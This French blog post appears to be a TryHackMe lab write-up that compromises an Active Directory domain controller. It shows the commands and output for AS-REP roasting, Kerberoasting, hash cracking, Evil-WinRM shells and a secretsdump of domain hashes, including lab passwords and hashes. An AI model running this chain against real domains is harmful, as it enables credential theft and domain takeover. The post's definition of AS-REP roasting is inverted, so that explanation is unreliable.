---
title: "VulnNet Roasted"
date: 2024-03-26 00:00:00
author: "Lukas"
layout: post
permalink: /vulnnet-roasted/
disqus_identifier: 0000-0000-0000-0001
cover: assets/uploads/2024/2024-thm-Roasted/img.png
description: "Analyse approfondie de la vulnérabilité VulnNet Roasted dans Active Directory."
tags:
  - "TryHackMe"
---


**VulnNet Entertainment** a rapidement déployé une nouvelle instance de gestion sur leur réseau très étendu…

VulnNet Entertainment vient de déployer une nouvelle instance sur leur réseau avec les administrateurs systèmes récemment embauchés. En tant qu'entreprise soucieuse de la sécurité, ils vous ont, comme toujours, engagé pour réaliser un test de pénétration et voir comment les administrateurs systèmes se débrouillent.
<!--more-->

## VulnNet Roasted
### Reconnaissance
#### Nmap

```bash
[May 12, 2024 - 11:38:12 (UTC)] exegol-thm VulnNet: Roasted # nmap -A 10.10.211.33
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-12 11:38 UTC
Nmap scan report for 10.10.211.33
Host is up (0.096s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE    SERVICE          VERSION
88/tcp   filtered kerberos-sec
135/tcp  filtered msrpc
139/tcp  filtered netbios-ssn
389/tcp  filtered ldap
464/tcp  filtered kpasswd5
593/tcp  filtered http-rpc-epmap
636/tcp  filtered ldapssl
3268/tcp filtered globalcatLDAP
3269/tcp filtered globalcatLDAPssl
3389/tcp filtered ms-wbt-server
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   62.48 ms 10.8.0.1
2   79.22 ms 10.10.211.33
```

#### Ports ouverts:
- **88/tcp:** Kerberos
- **135/tcp:** MSRPC (Microsoft Windows RPC)
- **139/tcp:** NetBIOS (Microsoft Windows netbios-ssn)
- **389/tcp:** LDAP (Lightweight Directory Access Protocol)
- **464/tcp:** Kpasswd5
- **593/tcp:** HTTP-RPC-EPMAP
- **636/tcp:** LDAPSSL
- **3268/tcp:** GlobalcatLDAP
- **3269/tcp:** GlobalcatLDAPssl
- **3389/tcp:** MS-WBT-SERVER (Microsoft Windows Remote Desktop)

#### enum4linux

```bash
[May 12, 2024 - 11:41:25 (UTC)] exegol-thm VulnNet: Roasted # enum4linux-ng -A 10.10.211.33
ENUM4LINUX - next generation (v1.3.3)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.211.33
[*] Username ......... ''
[*] Random Username .. 'qadhxoqj'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =====================================
|    Listener Scan on 10.10.211.33    |
 =====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ====================================================
|    Domain Information via LDAP for 10.10.211.33    |
 ====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: vulnnet-rst.local

 ===========================================================
|    NetBIOS Names and Workgroup/Domain for 10.10.211.33    |
 ===========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =========================================
|    SMB Dialect Check on 10.10.211.33    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ===========================================================
|    Domain Information via SMB session for 10.10.211.33    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: WIN-2BO8M1OE1M1
NetBIOS domain name: VULNNET-RST
DNS domain: vulnnet-rst.local
FQDN: WIN-2BO8M1OE1M1.vulnnet-rst.local
Derived membership: domain member
Derived domain: VULNNET-RST

 =========================================
|    RPC Session Check on 10.10.211.33    |
 =========================================
[*] Check for null session
[-] Could not establish null session: timed out
[*] Check for random user
[-] Could not establish random user session: timed out
[-] Sessions failed, neither null nor user sessions were possible

 ===============================================
|    OS Information via RPC for 10.10.211.33    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials

Completed after 60.57 seconds
```

Les informations obtenues sont les suivantes:
- **Nom de l'ordinateur NetBIOS:** WIN-2BO8M1OE1M1
- **Nom de domaine NetBIOS:** VULNNET-RST
- **Domaine DNS:** vulnnet-rst.local
- **FQDN:** WIN-2BO8M1OE1M1.vulnnet-rst.local
- **OS:** Windows 10, Windows Server 2019, Windows Server 2016
- **Version de l'OS:** 10.0

Une fois ça fais on peux regarder les SID du domaine avec `rpcclient`:

C'set quoi un SID ?
Le SID (Security Identifier) est un identifiant unique attribué à chaque compte utilisateur, groupe ou ordinateur dans un domaine Active Directory. Il est utilisé pour identifier de manière unique un objet ou une entité dans un domaine Active Directory.

```bash
[May 12, 2024 - 11:47:35 (UTC)] exegol-thm VulnNet: Roasted # lookupsid.py guest@10.10.211.33
Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs

Password:
[*] Brute forcing SIDs at 10.10.211.33
[*] StringBinding ncacn_np:10.10.211.33[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

BINGO ! On a des utilisateurs:
- **a-whitehat**
- **enterprise-core-vn**
- **j-goldenhand**
- **j-leet**
- **t-skid**

### Exploitation

#### As-Rep Roasting

C'est quoi l'As-Rep Roasting ?

L'attaque AS-REP Roasting est une attaque contre les comptes Active Directory qui n'ont pas l'attribut UF_DONT_REQUIRE_PREAUTH défini. L'attaque consiste à envoyer une demande de ticket Kerberos pour un utilisateur qui n'a pas l'attribut UF_DONT_REQUIRE_PREAUTH défini. L'attaque est appelée "roasting" car l'attaquant peut récupérer le hash du mot de passe de l'utilisateur sans avoir besoin de déchiffrer le trafic réseau.

```bash
[May 12, 2024 - 11:52:48 (UTC)] exegol-thm VulnNet: Roasted # GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip "10.10.211.33" "vulnnet-rst.local"/
Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs

[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:02349b9312c22cce838b122bbb4e6576$247f0fe80f8d9c3ced75694bf421006a815c89b6f98382b865582e42d4e4c248b36130f42f68de4c914c908c8c9adef2dc8173e8090d25b7bfec3bec292f64dd1ed1514415075d07399f13c3ca287be9c99e6b2a668fbfda658621cdb6ec13a81334e7acd95d261335b1f8454b1e8ab7f57996810fd98dbb65feeb0f706bf9652c8e304098ba05dc2fcb750b19487a66ea3689f67b1196efa17da808124ad220c623c2eb0f77d54e9304f3fb3346099e5f9e7d8fed0f3c5247d20d258dc25c8eb4455a6513b01399cfd6e7f24f332a9438b26fc6222977738773fcfeff4c63566f850dca6fc6cc72fd1df73d9e835d5218d63d615e19
```

On a récupéré le hash du mot de passe de l'utilisateur **t-skid**.

#### Cracking

On peut maintenant cracker le hash récupéré avec John The Ripper:

```bash
[May 12, 2024 - 11:54:10 (UTC)] exegol-thm VulnNet: Roasted # john --wordlist=`fzf-wordlists` ASREProastables.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
Cost 1 (etype) is 23 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
1g 0:00:00:01 DONE (2024-05-12 11:54) 0.6803g/s 2184Kp/s 2184Kc/s 2184KC/s tomaatjuh..tigris@livs
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Le mot de passe de l'utilisateur **t-skid** est **tj072889**.

#### Kerberoasting

C'est quoi le Kerberoasting ?

L'attaque Kerberoasting est une attaque contre les comptes Active Directory qui ont l'attribut servicePrincipalName défini. L'attaque consiste à envoyer une demande de ticket Kerberos pour un utilisateur qui a l'attribut servicePrincipalName défini. L'attaque est appelée "roasting" car l'attaquant peut récupérer le hash du mot de passe de l'utilisateur sans avoir besoin de déchiffrer le trafic réseau.

```bash
[May 12, 2024 - 12:03:25 (UTC)] exegol-thm VulnNet: Roasted # GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile hashes -dc-ip 10.10.211.33
Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 19:45:09.913979  2021-03-13 23:41:17.987528



[-] CCache file is not found. Skipping...
```

On a récupéré le hash du mot de passe de l'utilisateur **enterprise-core-vn**.
```bash
[May 12, 2024 - 12:03:42 (UTC)] exegol-thm VulnNet: Roasted # cat hashes
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$VULNNET-RST.local/enterprise-core-vn*$964e72ce6bca5255ff16822ec093621b$f4205c6f1560b7ccf8e41ea21919930a479b710eba5871ea2c2cae415115692801ce950513bfd01c8042faa4cdbe9cf01abfd13d8d593b6cf0125697dc69a482595497675584e7056b02ae92b49fe416a490103307191c092784c56c72ca18dedd843cd1568f085eaef37e4d107b346c6d4d03c9fc1e7c9b5c03f50d757a34d94f370b51fc841e61737520afd60eb4c2f94fde83c3e3773b1a4620051521c3045ea80c76181e2feb164c52bc6b8e8b5c20beb6cca6d7c12db081bf451c78f29ec884489ba4b58173877db82e862d1a1d2bf26f158f0d9c33badd596f181f37314beffefa60bd29f4da41aac80ff56f3eae5de78036f94aa552d91974c106c8609bc80cc81d5794172cd3bc56bb4da847d13cd320dd93343cb4743ab9f0907e79dea28fe5de0d9fb4fc0ea89dc514dd0b6d19915714b5b4d44cefaf859dd0afdcc1b6b11a666ecdc0a84c35d8116821570921f5ce236bba8225d77c52c0c06fab5c0dc5437cea9094af4cc37a550ecfdc4cb022589396f4cfdc7d3b559646b14a379df69656cd11213a155d95f47a220715c11061a3af33b81dfa836a3a7553874a5a936bea2dc9a284bcf2fcb5c582877dc9976d5d2d29ebbf84ea8853dc413512eb7d1dcf47b68b6ad17705b0b732c449ca9c4bb8801b63e90c825da161c0365211b4d4f54a6126b838f362c9b3d9ee234bb794021e6bf9645ff3ca0768885586d966d10ad540cffe06d18e617990a9b9f63c20c252cae2af2570e9a369d14debbcda58b768d274be8d3710c3fc8d497bfca1553fedf2017cfbf4808ac80a8a1b49961131af64dcb21ab0dfeb1b89b331b17e0349984a875039baf81cc1cc8e4d015c503ccc7065851b073ff1191413b763162bcca1588d1fca4db8830542eed9b561d376194183d078035ce74125b10c85841043cff5c2302965e55004810ca63d11260bab81ddc0456be7b2278b655dfd59683893dccdfc024c9cc0acb819dcf9f0cbafa29e8b22213a243451cfe902bf4051bd862ea80620c002502c9744dd143b11336782d9a2b815b17245faca22653b03c6367a9a36b22b312ba51e5e7bf1ef780a88d9e4c9f8bdf3ac58251c0199ff1dab58db3512c68a3ee3487f8142290f9ae2a9fc8d24faeadf204a8059f65288e929f78f09a57e8af2b2f2e0f13d222c339c58a23a5bbbca580a88d80c9055e2b39d7263e67ee16754fa788b3cca777354ccace352a664f45949aebf8492eb5996e765bbb266f418921e06a37bbcd234d2263999f9e029195bfe73421c1834f608d6f0efae2924478a8648a4c2d9af8481274e60f824c9ed022c501bf4e907c2318f88cf6119c8e15c205f51e283556aae05b2078411102b01e7d05fb09934d3c394846fcb03ceb730f4
```

#### Cracking

On peut maintenant cracker le hash récupéré avec John The Ripper:

```bash
[May 12, 2024 - 12:03:49 (UTC)] exegol-thm VulnNet: Roasted # john --wordlist=`fzf-wordlists` hashes
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
ry=ibfkfv,s6h,   (?)
1g 0:00:00:01 DONE (2024-05-12 12:04) 0.8621g/s 3559Kp/s 3559Kc/s 3559KC/s sadeceben123..ruddle
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Parfait ! On a récupéré le mot de passe de l'utilisateur **enterprise-core-vn** qui est **ry=ibfkfv,s6h,**.

#### Evil-WinRM

Maintenant on peut se connecter à la machine avec Evil-WinRM:
```bash
[May 12, 2024 - 12:06:27 (UTC)] exegol-thm VulnNet: Roasted # evil-winrm -i 10.10.211.33 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'


Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> dir
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> cd ..
*Evil-WinRM* PS C:\Users\enterprise-core-vn> cd "C:/Users/enterprise-core-vn/Desktop/"
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> type "C:/Users/enterprise-core-vn/Desktop/user.txt"
THM{726b7c0baaac1455d05c827b5561f4ed}
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop>
```

On a récupéré le flag utilisateur **THM{726b7c0baaac1455d05c827b5561f4ed}**.

### Escalade de privilèges

#### SMB

On peut maintenant regarder les partages SMB avec `smbmap`:

```bash
[May 12, 2024 - 12:14:43 (UTC)] exegol-thm VulnNet: Roasted # smbmap -H "10.10.211.33" -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authentidated session(s)

[+] IP: 10.10.211.33:445	Name: vulnnet-rst.local   	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	SYSVOL                                            	READ ONLY	Logon server share
	VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous                      	READ ONLY	VulnNet Enterprise Sharing
``` 

On a deux partages SMB:
- **VulnNet-Business-Anonymous**
- **VulnNet-Enterprise-Anonymous**

Les autre partages sont des partages par défaut de Windows.

```bash
[May 12, 2024 - 12:18:05 (UTC)] exegol-thm VulnNet: Roasted # smbclient \\\\10.10.211.33\\SYSVOL -U 'enterprise-core-vn%ry=ibfkfv,s6h,'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 11 19:19:49 2021
  ..                                  D        0  Thu Mar 11 19:19:49 2021
  vulnnet-rst.local                  Dr        0  Thu Mar 11 19:19:49 2021

		8771839 blocks of size 4096. 4553871 blocks available
smb: \> cd vulnnet-rst.local\
smb: \vulnnet-rst.local\> ls
  .                                   D        0  Thu Mar 11 19:23:40 2021
  ..                                  D        0  Thu Mar 11 19:23:40 2021
  DfsrPrivate                      DHSr        0  Thu Mar 11 19:23:40 2021
  Policies                            D        0  Thu Mar 11 19:20:26 2021
  scripts                             D        0  Tue Mar 16 23:15:49 2021

		8771839 blocks of size 4096. 4553871 blocks available
smb: \vulnnet-rst.local\> cd scripts\
smb: \vulnnet-rst.local\scripts\> ls
  .                                   D        0  Tue Mar 16 23:15:49 2021
  ..                                  D        0  Tue Mar 16 23:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 23:18:14 2021

		8771839 blocks of size 4096. 4553871 blocks available
smb: \vulnnet-rst.local\scripts\> wget ResetPassword.vbs
wget: command not found
smb: \vulnnet-rst.local\scripts\> get ResetPassword.vbs
getting file \vulnnet-rst.local\scripts\ResetPassword.vbs of size 2821 as ResetPassword.vbs (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \vulnnet-rst.local\scripts\> exit
```

On a récupéré le script **ResetPassword.vbs**.
    
```bash
    [May 12, 2024 - 12:20:21 (UTC)] exegol-thm VulnNet: Roasted # cat ResetPassword.vbs
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

' Determine DNS domain name from RootDSE object.
Set objRootDSE = GetObject("LDAP://RootDSE")
strDNSDomain = objRootDSE.Get("defaultNamingContext")

' Use the NameTranslate object to find the NetBIOS domain name from the
' DNS domain name.
Set objTrans = CreateObject("NameTranslate")
objTrans.Init ADS_NAME_INITTYPE_GC, ""
objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4)
' Remove trailing backslash.
strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)

' Use the NameTranslate object to convert the NT user name to the
' Distinguished Name required for the LDAP provider.
On Error Resume Next
objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain & "\" & strUserNTName
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
' Escape any forward slash characters, "/", with the backslash
' escape character. All other characters that should be escaped are.
strUserDN = Replace(strUserDN, "/", "\/")

' Bind to the user object in Active Directory with the LDAP provider.
On Error Resume Next
Set objUser = GetObject("LDAP://" & strUserDN)
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
objUser.SetPassword strPassword
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "Password NOT reset for " &vbCrLf & strUserNTName
    Wscript.Echo "Password " & strPassword & " may not be allowed, or"
    Wscript.Echo "this client may not support a SSL connection."
    Wscript.Echo "Program aborted"
    Wscript.Quit
Else
    objUser.AccountDisabled = False
    objUser.Put "pwdLastSet", 0
    Err.Clear
    objUser.SetInfo
    If (Err.Number <> 0) Then
        On Error GoTo 0
        Wscript.Echo "Password reset for " & strUserNTName
        Wscript.Echo "But, unable to enable account or expire password"
        Wscript.Quit
    End If
End If
On Error GoTo 0

Wscript.Echo "Password reset, account enabled,"
Wscript.Echo "and password expired for user " & strUserNTName#
```

HOP ! On a des credentials:

```bash
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```

#### privesc

On peut maintenant se connecter à la machine avec Evil-WinRM:

```bash
[May 12, 2024 - 12:24:24 (UTC)] exegol-thm VulnNet: Roasted # evil-winrm -i 10.10.211.33 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'


Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> dir
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== =============================================
vulnnet-rst\a-whitehat S-1-5-21-1589833671-435344116-4136949213-1105


GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                          Attributes
================================================== ================ ============================================ ===============================================================
Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Domain Admins                          Group            S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Denied RODC Password Replication Group Alias            S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Ici on a des informations intéressantes:

- **VULNNET-RST\Domain Admins**

Une fois que l'on a ça on peut penser a faire un secretsdump

#### secretsdump

```bash
[May 12, 2024 - 12:28:48 (UTC)] exegol-thm VulnNet: Roasted # secretsdump VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@10.10.211.33
Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
VULNNET-RST\WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:d1cf5bd71959114ef8a147a565ae44490134863025a53ea637e5005ea0f8e2da
VULNNET-RST\WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:475c9d59b8f1d616ccb630e93ae31fc0
VULNNET-RST\WIN-2BO8M1OE1M1$:des-cbc-md5:e32f734cda85a7ea
VULNNET-RST\WIN-2BO8M1OE1M1$:plain_password_hex:63edeac7b7c3c8e4fdf2b0731130beeb27815486e1afe3a870b55e7ec03efe78f9c63885fe1511b2cbe66b5c93abd83bc084c3cfb725d6e6c4a08de89a2a821b182b87880d9c7c62f7bc8c183f200345c06155413f2268def9fe3b02eeb639b77a375356316ead43330ece1a33e9866f2998bf1fca8c56c0caa0656c863996aaf41eed3de33de526e90340e2ff85ad774189857528cc1281c31519c28318c3541a306ecb034631d5b9491ba2e35858c023e4e68af1c7f198e36400bd988f097bbaf069307c6842274a50f1ab8815dc12ea1b7637d684e90e470d1f7c69712e77050cda0bf34b3bce2a3c9a590da9bb7e
VULNNET-RST\WIN-2BO8M1OE1M1$:aad3b435b51404eeaad3b435b51404ee:b53e5ad16472b47f8fb7292cc3f1f55a:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x20809b3917494a0d3d5de6d6680c00dd718b1419
dpapi_userkey:0xbf8cce326ad7bdbb9bbd717c970b7400696d3855
[*] NL$KM
 0000   F3 F6 6B 8D 1E 2A F4 8E  85 F6 7A 46 D1 25 A0 D3   ..k..*....zF.%..
 0010   EA F4 90 7D 2D CB A5 8C  88 C5 68 4C 1E D3 67 3B   ...}-.....hL..g;
 0020   DB 31 D9 91 C9 BB 6A 57  EA 18 2C 90 D3 06 F8 31   .1....jW..,....1
 0030   7C 8C 31 96 5E 53 5B 85  60 B4 D5 6B 47 61 85 4A   |.1.^S[.`..kGa.J
NL$KM:f3f66b8d1e2af48e85f67a46d125a0d3eaf4907d2dcba58c88c5684c1ed3673bdb31d991c9bb6a57ea182c90d306f8317c8c31965e535b8560b4d56b4761854a
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
